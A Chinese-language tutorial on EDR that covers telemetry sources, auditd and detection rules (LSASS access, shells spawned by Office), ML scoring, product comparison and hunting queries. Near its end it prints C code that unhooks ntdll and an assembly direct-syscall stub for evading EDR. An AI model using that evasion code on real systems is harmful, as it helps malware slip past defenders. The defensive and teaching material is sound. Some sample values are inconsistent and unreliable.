# EDR端点检测与响应

> 端点检测与响应（Endpoint Detection and Response, EDR）是端点安全的核心技术。EDR通过持续收集端点遥测数据，利用规则、行为和机器学习模型检测威胁，并提供快速响应能力。

## EDR的数据采集体系

EDR的核心能力在于全面的端点数据采集。以下是在Windows和Linux上的主要遥测数据源：

### Windows遥测源

| 数据源 | ETW Provider / API | 采集内容 |
|--------|-------------------|---------|
| 进程创建 | Microsoft-Windows-Kernel-Process | 进程创建/终止，父进程PID，命令行参数 |
| 网络连接 | Microsoft-Windows-Kernel-Network | TCP/UDP连接创建，DNS查询，HTTP请求 |
| 文件操作 | Microsoft-Windows-Kernel-File | 文件创建/写入/删除/重命名，文件路径 |
| 注册表修改 | Microsoft-Windows-Kernel-Registry | 注册表项创建/修改/删除，键值内容 |
| 脚本执行 | Microsoft-Windows-PowerShell | PowerShell命令，ScriptBlock日志 |
| 内存操作 | ETW-TiWorker / API Hook | 内存分配、代码注入、DLL加载 |

```json
{
  "event": {
    "source": "Sysmon",
    "event_id": 1,
    "process": {
      "guid": "{A23E4F12-1234-5678-9ABC-DEF012345678}",
      "pid": 4824,
      "image": "C:\\Users\\zhangsan\\Downloads\\invoice.exe",
      "command_line": "invoice.exe /silent /install",
      "parent_pid": 1234,
      "parent_image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      "hashes": {
        "md5": "a1b2c3d4e5f678901234567890abcdef",
        "sha256": "abc123def456abc123def456abc123def456abc123def456abc123def456abc1"
      }
    },
    "user": {
      "domain": "CORP",
      "name": "zhangsan"
    },
    "timestamp": "2024-05-26T10:15:30.123Z"
  }
}
```

### Linux遥测源

| 数据源 | 内核接口 | 采集内容 |
|--------|---------|---------|
| 进程事件 | auditd / eBPF tracepoints | execve系统调用，进程生命周期 |
| 文件完整性 | fanotify / inotify | 文件变化监控，关键目录保护 |
| 网络事件 | eBPF (XDP/TC) | Socket创建，网络连接，DNS查询 |
| 系统调用 | eBPF kprobes/tracepoints | 敏感系统调用跟踪 |
| 用户行为 | auditd (pam_tty_audit) | SSH登录，命令执行，sudo操作 |

```bash
# auditd规则配置示例
## 监控所有execve系统调用
-a always,exit -F arch=b64 -S execve -k process_execution

## 监控SUID文件执行
-a always,exit -F arch=b64 -S execve -F uid=0 -k privileged_exec

## 监控敏感文件访问
-w /etc/shadow -p rwxa -k shadow_access
-w /etc/ssh/sshd_config -p rwxa -k sshd_config

## 监控DNS配置修改
-w /etc/resolv.conf -p rwa -k dns_change
```

## 行为检测引擎

### 攻击链检测

EDR将端点事件关联成攻击链，利用预定义的检测规则：

```python
class AttackChainDetector:
    def __init__(self):
        self.rules = [
            # 规则1：Office应用生成进程（钓鱼攻击检测）
            SuspiciousParentProcessRule(
                parent_processes=["WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE", "POWERPNT.EXE"],
                suspicious_children=["cmd.exe", "powershell.exe", "wscript.exe", "cscript.exe", "mshta.exe"],
                description="Office应用生成可疑子进程，可能为宏病毒",
                severity="HIGH"
            ),
            
            # 规则2：从非标准位置执行的可执行文件
            ExecutableFromSuspiciousPathRule(
                suspicious_paths=[
                    r"C:\Users\*\AppData\Local\Temp\*",
                    r"C:\Users\*\Downloads\*",
                    r"C:\Windows\Temp\*",
                    r"\Device\Mup\*",  # SMB共享
                ],
                description="从临时目录或下载目录执行可执行文件",
                severity="MEDIUM"
            ),
            
            # 规则3：LSASS进程访问（凭据窃取检测）
            ProcessAccessRule(
                target_process="lsass.exe",
                access_rights=["PROCESS_VM_READ", "PROCESS_ALL_ACCESS"],
                exception_processes=["lsm.exe", "winlogon.exe", "csrss.exe"],
                description="未经授权的进程访问LSASS，可能为凭据窃取",
                severity="CRITICAL"
            ),
        ]
    
    def evaluate(self, events):
        alerts = []
        for rule in self.rules:
            if rule.match(events):
                alerts.append(rule.generate_alert(events))
        return alerts
```

### 基于机器学习的异常检测

EDR使用ML模型对端点行为进行建模，检测未知威胁：

```python
# EDR ML模型特征示例
extracted_features = {
    "process_features": {
        "is_signed": False,
        "signing_company": "Microsoft Corporation",
        "entropy": 6.8,               # 文件熵值，高熵可能为混淆/加密
        "file_size": 1423360,          # 文件大小
        "imports_count": 45,
        "suspicious_imports": [
            "VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread"  # 潜在的恶意API
        ],
        "section_entropy": [5.2, 3.1, 7.9, 4.5],  # 各节区熵值
    },
    "behavior_features": {
        "spawned_process_count": 5,
        "file_write_count": 25,
        "registry_write_count": 8,
        "network_connection_count": 3,
        "suspicious_api_calls": [
            "NtUnmapViewOfSection",   # 进程镂空常见手法
            "SetThreadContext",
        ],
        "time_since_boot_hours": 0.5,  # 系统启动后30分钟内运行的进程
    }
}

# 简化的ML推理
def anomaly_score(features):
    score = 0
    # 检查是否为已签名文件
    if not features["process_features"]["is_signed"]:
        score += 20
    # 检查可疑API调用
    suspicious_count = len(features["process_features"]["suspicious_imports"])
    score += suspicious_count * 10
    # 检查进程行为
    if features["behavior_features"]["spawned_process_count"] > 3:
        score += 15
    # 综合评分
    return min(score, 100)  # 0-100
```

## EDR产品对比

| 能力 | CrowdStrike Falcon | SentinelOne | Microsoft Defender for Endpoint |
|------|-------------------|-------------|-------------------------------|
| 架构 | 云原生，单一轻量Agent | Agent + 云管理控制台 | 集成Windows，云+本地 |
| 检测引擎 | 威胁图谱+ML+行为分析 | AI自动检测，Storyline技术 | 行为检测+ML+Microsoft威胁情报 |
| 响应能力 | 手动/自动隔离，RTR远程终端 | 自动响应，一键回滚 | 自动调查（AIR），与M365集成 |
| 回滚能力 | 不支持 | 支持：文件回滚（Windows） | 支持：利用卷影副本回滚 |
| EDR旁路检测 | 用户态Hook + Kernel回调 | Kernel驱动直接系统调用监控 | Windows ETW原生 + Kernel回调 |
| 查询语言 | Event Search (SQL-like) | Deep Visibility (SQL-like) | Kusto Query Language (KQL) |

### CrowdStrike Falcon的实际应用

```kusto
// CrowdStrike Falcon Event Search：查找从Office应用生成的PowerShell进程
event_simpleName=ProcessRollup2
| search ImageFileName=*\\powershell.exe
| search ParentBaseFileName IN (WINWORD.EXE, EXCEL.EXE, OUTLOOK.EXE)
| table ComputerName, UserName, CommandLine, ParentBaseFileName, SHA256HashData
| sort -_time
```

### Microsoft Defender 高级搜索（KQL）

```kusto
// 查找可疑的远程线程注入事件
DeviceEvents
| where ActionType == "CreateRemoteThreadApiCall"
| extend TargetProcessId = toint(AdditionalFields.TargetProcessId)
| join kind=inner (
    DeviceProcessEvents
    | project TargetPid = ProcessId, TargetProcess = FileName, DeviceId, Timestamp
) on $left.TargetProcessId == $right.TargetPid
| project Timestamp, DeviceName, InitiatingProcessFileName, TargetProcess, 
          ActionType, AdditionalFields
| order by Timestamp desc
```

## EDR绕过技术

### Userland Hook Unhooking

EDR通过Hook ntdll.dll中的系统调用函数来监控进程行为。攻击者可以恢复被Hook的函数：

```c
// 绕过EDR：恢复ntdll.dll中的系统调用存根
void unhook_ntdll() {
    HANDLE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll == NULL) return;
    
    // 从磁盘读取干净的ntdll.dll副本
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, 0, NULL);
    
    HANDLE hMapping = CreateFileMapping(hFile, NULL,
        PAGE_READONLY, 0, 0, NULL);
    LPVOID cleanNtdll = MapViewOfFile(hMapping,
        FILE_MAP_READ, 0, 0, 0);
    
    // 获取内存中ntdll的.text节区
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER textSection = IMAGE_FIRST_SECTION(nt);
    
    // 用磁盘上的干净代码覆盖被Hook的.text节区
    DWORD oldProtect;
    VirtualProtect(textSection->VirtualAddress + hNtdll,
        textSection->SizeOfRawData,
        PAGE_EXECUTE_READWRITE, &oldProtect);
    
    memcpy(textSection->VirtualAddress + hNtdll,
        (BYTE*)cleanNtdll + textSection->VirtualAddress,
        textSection->SizeOfRawData);
    
    VirtualProtect(textSection->VirtualAddress + hNtdll,
        textSection->SizeOfRawData, oldProtect, &oldProtect);
    
    UnmapViewOfFile(cleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}
```

### Direct Syscalls

攻击者绕过EDR的用户态Hook，直接通过`syscall`指令进入内核：

```asm
; x64汇编：直接系统调用绕过EDR Hook
section .text
    global NtCreateProcessDirect
    
NtCreateProcessDirect:
    mov r10, rcx
    mov eax, 0xAF    ; NtCreateProcess的SSN (System Service Number)
    syscall          ; 直接syscall，不经过ntdll
    ret
```

## 响应能力

### 自动响应动作

| 响应动作 | 描述 | 恢复方式 |
|---------|------|---------|
| 网络隔离 | 将端点从网络中隔离，但仍可与管理控制台通信 | 自动或手动移除隔离 |
| 进程终止 | 终止恶意进程及其子进程 | 不可恢复（需重启进程） |
| 文件隔离 | 将恶意文件移至安全隔离区 | 可从隔离区恢复误报文件 |
| 注册表回滚 | 恢复被修改的注册表项 | 自动或手动 |
| 内存取证 | 收集内存快照用于取证分析 | 无恢复动作 |
| 收集取证包 | 打包系统取证数据供分析师审查 | 文件需要清理 |

## 总结

EDR通过全面采集端点遥测数据，结合规则、行为和机器学习模型实现高级威胁检测。面对现代攻击者不断进化的绕过技术（Unhooking、Direct Syscall等），EDR产品也在持续增强内核实测检测能力。在选择EDR产品时，需要综合考虑检测能力、响应自动化、生态集成和管理便捷性。
